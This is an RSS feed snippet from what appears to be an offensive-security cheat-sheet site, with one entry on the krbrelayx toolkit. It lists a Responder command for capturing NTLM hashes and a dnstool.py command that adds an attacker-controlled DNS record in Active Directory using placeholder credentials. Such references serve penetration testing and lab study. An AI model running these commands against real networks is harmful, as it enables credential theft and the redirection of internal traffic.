channel.title: Krbrelayx on TLDRBins
channel.description: Recent content in Krbrelayx on TLDRBins

item.title: Krbrelayx
item.description: Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' --action add --record test --data <LOCAL_IP> --type A <DOMAIN> Ref: krbrelayx tools
